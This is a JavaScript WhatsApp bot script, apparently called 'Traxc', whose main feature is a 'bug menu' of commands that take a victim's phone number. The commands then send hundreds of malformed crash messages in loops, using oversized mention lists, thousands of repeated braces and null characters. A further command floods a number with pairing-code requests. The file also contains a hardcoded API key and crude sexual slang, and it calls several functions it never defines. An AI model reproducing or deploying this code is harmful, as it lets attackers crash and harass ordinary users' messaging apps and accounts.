//========HELO FRIEND========//
require('./config')
const { 
default: baileys, 
proto, 
getContentType, 
generateWAMessage, 
generateWAMessageFromContent, 
generateWAMessageContent,
prepareWAMessageMedia, 
downloadContentFromMessage
} = require("@whiskeysockets/baileys");
const fs = require('fs-extra')
const util = require('util')
const chalk = require('chalk')
const { addPremiumUser, delPremiumUser } = require("./lib/premiun");
const { getBuffer, getGroupAdmins, getSizeMedia, fetchJson, sleep, isUrl, runtime } = require('./lib/myfunction');
//===============
module.exports = rikz = async (rikz, m, chatUpdate, store) => {
try {
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "messageContextInfo" ?
m.message.buttonsResponseMessage?.selectedButtonId ||
m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
m.text : "");
const prefix = (typeof body === "string" ? global.prefix.find(p => body.startsWith(p)) : null) || "";  
const isCmd = !!prefix;  
const args = isCmd ? body.slice(prefix.length).trim().split(/ +/).slice(1) : []; 
const command = isCmd ? body.slice(prefix.length).trim().split(/ +/)[0].toLowerCase() : "";
const text = q = args.join(" ")//hard
const fatkuns = m.quoted || m;
const quoted = ["buttonsMessage", "templateMessage", "product"].includes(fatkuns.mtype)
? fatkuns[Object.keys(fatkuns)[1] || Object.keys(fatkuns)[0]]
: fatkuns;
//======================
const botNumber = await rikz.decodeJid(rikz.user.id);
const premuser = JSON.parse(fs.readFileSync("./system/database/premium.json"));
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender);
const isPremium = [botNumber, ...global.owner, ...premuser.map(user => user.id.replace(/[^0-9]/g, "") + "@s.whatsapp.net")].includes(m.sender);
if (!rikz.public && !isCreator) return;
//======================
const isGroup = m.chat.endsWith("@g.us");
const groupMetadata = isGroup ? await rikz.groupMetadata(m.chat).catch(() => ({})) : {};
const participants = groupMetadata.participants || [];
const groupAdmins = participants.filter(v => v.admin).map(v => v.id);
const isBotAdmins = groupAdmins.includes(botNumber);
const isAdmins = groupAdmins.includes(m.sender);
const groupName = groupMetadata.subject || "";
//======================
if (m.message) {
rikz.readMessages([m.key]);
console.log("┏━━━━━━━━━━━━━━━━━━━━━━━=");
console.log(`┃¤ ${chalk.hex("#FFD700").bold("📩 NEW MESSAGE")} ${chalk.hex("#00FFFF").bold(`[${new Date().toLocaleTimeString()}]`)} `);
console.log(`┃¤ ${chalk.hex("#FF69B4")("💌 Dari:")} ${chalk.hex("#FFFFFF")(`${m.pushName} (${m.sender})`)} `);
console.log(`┃¤ ${chalk.hex("#FFA500")("📍 Di:")} ${chalk.hex("#FFFFFF")(`${groupName || "Private Chat"}`)} `);
console.log(`┃¤ ${chalk.hex("#00FF00")("📝 Pesan:")} ${chalk.hex("#FFFFFF")(`${body || m?.mtype || "Unknown"}`)} `);
console.log("┗━━━━━━━━━━━━━━━━━━━━━━━=")}
//FUNCTION BUG
async function locationfc(X, ptcp = true) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "🩸 TRAXC IS HERE 🩸",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -6666666666,
                degreesLongitude: 6666666666,
                name: "🩸BOKEP",
                address: "🩸BOKEP",
              }, 
            },
            body: {
              text: "🩸BOKEP",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: X,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await rikz.relayMessage(X, message, {
      messageId: null,
      participant: { jid: X },
      userJid: X,
    });
  } catch (err) {
    console.log(err);
  }
}
async function sistemFc(target) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "BOKEP HOTS",
              hasMediaAttachment: false,
            },
            body: {
              text: "Traxc new era! ",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: venomModsData + "\u0000",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: venomModsData + "Neww eraaa",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await rikz.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}
//======================
switch (command) {
//case bug
case "crot-dalam": {

if (!isPremium) return m.reply('Khusus Premium');

if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628×××`);

target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

m.reply(`*[!] bug successfully sent to target*`); 

          for (let i = 0; i < 870; i++) {
           await locationfc(target, ptcp = true) 
           await sleep(500)
           await sistemFc(target, true)
        }

    }

  

break;
//======================
case "amba-crot": {
    
if (!isPremium) return m.reply('Khusus Premium');  
    
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628���`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`*[!] bug successfully sent to target*`); 
          for (let i = 0; i < 879; i++) {
            await protocolbug1(target, true) 
            await protocolbug2(target, true)
            await protocolbug3(target, true)
            await protocolbug4(target, true)
            await protocolbug5(target, true)
            await protocolbug5(target, false)
            await protocolbug7X(target, true)
            await protocolbug7X(target, false)
            await protocolbug8(target, true)
            await protocolbug8(target, false)
        }
    }
  
break;
//======================
case "mas-owi": {
    
if (!isPremium) return m.reply('Khusus Premium');
    
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628×××`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`*[!] bug successfully sent to target*`); 
          for (let i = 0; i < 879; i++) {
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await protocolbug1(target, true) 
            await protocolbug2(target, true)
            await protocolbug3(target, true)
            await protocolbug4(target, true)
            await protocolbug5(target, true)
            await protocolbug5(target, false)
            await protocolbug7X(target, true)
            await protocolbug7X(target, false)
            await protocolbug8(target, true)
            await protocolbug8(target, false)
        }
    }
  
break;
//======================
case "mas-bowo": {
    
if (!isPremium) return m.reply('Khusus Premium');  
    
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628���`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`*[!] bug successfully sent to target*`); 
          for (let i = 0; i < 879; i++) {
            await locationfc(target, true)
            await locationfc(target, false)
            await locationfc(target, true)
            await locationfc(target, false)
        }

    }
  
break;

case "mas-aniss": {
    
if (!isPremium) return m.reply('Khusus Premium');  
    
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628���`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`*[!] bug successfully sent to target*`); 
          for (let i = 0; i < 879; i++) {
            await bulldozer(target)
            await protocolbug1(target, true) 
            await protocolbug2(target, true)
            await protocolbug3(target, true)
            await protocolbug4(target, true)
            await protocolbug5(target, true)
            await protocolbug5(target, false)
            await protocolbug7X(target, true)
            await protocolbug7X(target, false)
            await protocolbug8(target, true)
            await protocolbug8(target, false)
        }

    }
  
break;

    case '.price': {
  const buttons = [
    { buttonId: '.price mlbb-global', buttonText: { displayText: 'MLBB Global' }, type: 1 },
    { buttonId: '.price mlbb-brazil', buttonText: { displayText: 'MLBB Brazil' }, type: 1 },
    { buttonId: '.price mlbb-my', buttonText: { displayText: 'MLBB Malaysia' }, type: 1 },
    { buttonId: '.price codm', buttonText: { displayText: 'Call of Duty Mobile' }, type: 1 },
  ];

  const buttonMessage = {
    text: `Hello ${pushname}\nRole: ${userRole}\n\nSelect the game region to view available top-up prices.`,
    footer: 'Powered by GameVia',
    buttons,
    headerType: 2
  };

  await rikz.sendMessage(from, buttonMessage, { quoted: msg });
  break;
}

case '.price mlbb-global':
case '.price mlbb-brazil':
case '.price mlbb-my':
case '.price codm': {
  const slug = command.split(' ')[1] || text.trim().toLowerCase();
  const apiKey = 'API-GVCDEAD0E38EA13632';

  const response = await fetch('https://api.gamevia.shop/v1/get_products.php', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'x-api-key': apiKey
    },
    body: JSON.stringify({ slug })
  });

  const data = await response.json();
  if (!data.success) return reply('Failed to fetch product list.');

  const sections = [
    {
      title: `${data.game_name} (${slug.toUpperCase()})`,
      rows: data.products.map(p => ({
        title: p.name,
        description: `RM${p.price.toFixed(2)} | Stock: ${p.stock}`,
        rowId: `.order ${p.srv_code}`
      }))
    }
  ];

  const listMessage = {
    text: `Game: ${data.game_name}\nSelect a product to order.`,
    footer: 'Powered by GameVia',
    title: 'Product Price List',
    buttonText: 'View Products',
    sections
  };

  await rikz.sendMessage(from, { listMessage }, { quoted: msg });
  break;
    }
//======================
case 'public': {
if (!isCreator) return m.reply(mess.owner) 
if (rikz.public === true) return m.reply("𝙏𝙍𝘼𝙓𝘾 𝘿𝙊𝙉𝙀 𝙈𝙊𝘿𝙀 𝙋𝙐𝘽𝙇𝙄𝘾");
rikz.public = true
m.reply(mess.succes)
}
break
//======================
case 'self': {
if (!isCreator) return m.reply(mess.owner) 
if (rikz.public === false) return m.reply("𝙏𝙍𝘼𝙓𝘾 𝘿𝙊𝙉𝙀 𝙈𝙊𝘿𝙀 𝙎𝙀𝙇𝙀𝘽𝘽𝘽𝘽");
rikz.public = false
m.reply(mess.succes)
}
break
//======================

case "menu": {
let itsmenu = 
`

> 口 𝙏𝙍𝘼𝙓𝘾 _𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝟰_ !!
Hello! Have A Nice Day!🤍

_"jangan berpikir tidak mungkin, tapi berpikirlah bagaimana caranya"_

– 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 𝗕𝗢𝗧
❒ Botname : Traxc
❒ Creator : VallxDev 
❒ Version : 4.0.0  
❒ Status : *Free*

*Script Information :*
https://whatsapp.com/channel/0029Vb3LbOyDZ4LVYsjO0Z0T
> © VallxDev (DEV NGUAWUR CIKK)

`;
await rikz.sendMessage(m.chat, {
image: { url: "https://files.catbox.moe/k1vd3r.jpg" },
caption: itsmenu
}, { quoted: m });
}
break; 

case "traxc": {
let itsmenu = 
`

> 口 𝙏𝙍𝘼𝙓𝘾 _𝗩𝗘𝗥𝗦𝗜𝗢𝗡_ 𝟰 !!
Hello! Have A Nice Day!🤍

_"jangan berpikir tidak mungkin, tapi berpikirlah bagaimana caranya"_

– 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 𝗕𝗢𝗧
❒ Botname : Traxc
❒ Creator : VallxDev
❒ Version : 4.0 
❒ Status : *Free*

– 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔
➛ . addmurbug
➛ . delmurbug

– 𝐁𝐔𝐆 𝐌𝐄𝐍𝐔
➛ .amba-crot 62xxx
➛ .crot-dalam 62xxx
➛ .mas-owi 62xxx
➛ .mas-bowo 62xxx
➛ .mas-aniss 62xxx

– 𝐅𝐔𝐍 𝐌𝐄𝐍𝐔
➛ .spairing 62xxxx
➛ .sreactch link nya 

*Script Information :*
https://whatsapp.com/channel/0029Vb6OnKIIHphDJHrHPD0a
> © VallxDev (DEV NGUAWUR CIKK)

`;
await rikz.sendMessage(m.chat, {
image: { url: "https://files.catbox.moe/k1vd3r.jpg" },
caption: itsmenu
}, { quoted: m });
}
break; 

//======================
case "addmurbug": {
if (!isCreator) return m.reply(mess.owner);
if (!text) return m.reply("❌ Example: /addmurbug (nomor)");
let user = text.replace(/[^\d]/g, "");
addPremiumUser(user, 30);
m.reply(`✅ Add murbug:\n• ${user} (30 days)`)}
break;
//======================
case "delmurbug": {
if (!isCreator) return m.reply(mess.owner);
if (!text) return m.reply("❌ Example: /delmurbug (nomor)");
let user = text.replace(/[^\d]/g, ""); 
let removed = delPremiumUser(user);
m.reply(removed ? `✅ Removed murbug:\n• ${user}` : "❌ User tidak ditemukan")}
break;
//======================
//case reactch
  case "sreactch": {

if (!isPremium) return m.reply('Khusus Premium');

if (!text) return m.reply(".sreactch linkpesan 😂")

if (!args[0] || !args[1]) return m.reply("Wrong Format")

if (!args[0].includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")

let result = args[0].split('/')[4]

let serverId = args[0].split('/')[5]

let res = await rikz.newsletterMetadata("invite", result)

await rikz.newsletterReactMessage(res.id, serverId, args[1])

m.reply(`Berhasil mengirim reaction ${args[1]} ke dalam channel ${res.name}`)

}

break      
//case spam pair
//======================
case 'spairing': {
  if (!isPremium) return m.reply('Khusus Premium');
  if (!text) return m.reply(`*Example:* ${prefix + command} +628xxxxxx|150`);
  m.reply('proses...');
  let [peenis, pepekk = "200"] = text.split("|");
  let target = peenis.replace(/[^0-9]/g, '').trim();
  const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
  const { state } = await useMultiFileAuthState('pepek');
  const { version } = await fetchLatestBaileysVersion();
  const pino = require("pino");
  const sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) });
  const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
  for (let i = 0; i < pepekk; i++) {
    await sleep(1500);
    let prc = await sucked.requestPairingCode(target);
    console.log(`_Succes Spam Pairing Code - Number : ${target} - Code : ${prc}_`);
  }
  await sleep(15000);
}
break;

case 'cek-kontol': case 'idch': {
if (!text) return m.reply("link ch nya mana kontol?")
if (!text.includes("https://whatsapp.com/channel/")) return 
m.reply("Link tautan tidak valid")
m.reply(`*Cek Id Ch Feature Process!...*`)
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await rikz.newsletterMetadata("invite", result)
let teks = `${res.id}`
return m.reply(teks)
}
break;
//======================
default:
}} catch (err) {
console.log('\x1b[1;31m'+err+'\x1b[0m')}}
